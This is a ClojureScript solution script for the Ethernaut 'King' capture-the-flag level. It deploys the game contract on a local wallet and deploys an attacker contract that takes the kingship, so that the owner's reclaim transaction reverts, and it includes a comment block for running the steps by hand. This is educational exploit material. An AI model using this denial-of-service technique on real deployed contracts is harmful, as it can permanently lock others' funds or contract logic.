(ns ctf.ethernaut.king
  "To break this game we can 'King' a contract that 'cannot receive' ether.

  This way owner (deployer) won't be able to claim the kingship back."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]]))


;; rename to get-player!
(def player (w/get-player! w/local-provider))


(defn deploy-king!
  "Owner deploys the King contract!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :king w/local-wallet)]
    (.deploy contract)))

(defn deploy-attacker!
  "Deployes the Attacker contract.
  In its contrcutor it will `transfer` some amount to
  the King contract. The value should be high enough
  to make the Attacker the new king."
  [king-addr value]
  (let [contract (u/contract :king/attacker player)
        tx (js-obj "gasLimit"
                   2000000
                   "value"
                   (u/eth-str->wei "10"))]
    (.deploy contract
             king-addr
             value
             tx)))


(defn attack! []
  (a/go
    (try
      (let [king (<p! (deploy-king!))
            current-king (<p! (._king king))
            ;; player deployes this contrat!
            attacker (<p!
                      (deploy-attacker!
                       (.-address king)
                       (u/eth-str->wei "1")))]
        ;; Here owner tries to take back the Kingship
        ;; by sending 11 ETH (player sent 10 to become king)
        ;; to the King contract.
        (<p! (w/fund! "11"
                      w/local-wallet
                      (.-address king))))
      (catch js/Error err
        ;; Owner's transaction must revert!
        ;; Because there is no fallback or receive
        ;; function in the our Attacker contract
        (js/console.log (ex-cause err))))))


(comment

  ;; Execute this block to launch the attack
  (a/take! (attack!) #(prn %))


  (def __king (atom ""))
  (-> (deploy-king!)
      (.then #(reset! __king %))
      (.catch #(.log js/console %)))

  (.then (.prize @__king) #(.log js/console (.add % 1)))

  (.then (._king @__king) #(.log js/console %))

  (.-address player)


  (def _attacker (atom ""))
  (-> (deploy-attacker!
       (.-address @king)
       (u/eth-str->wei "1"))
      (.then #(reset! _attacker %))
      (.catch #(.log js/console %)))


  ;; now make the owner reclaim kingship by sending 11 ETH
  ;; send 11 ETH to (.-address king)
  (.then (.owner @__king) #(.log js/console %))

  (-> (w/fund! "11"
               w/local-wallet
               (.-address @__king))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  )
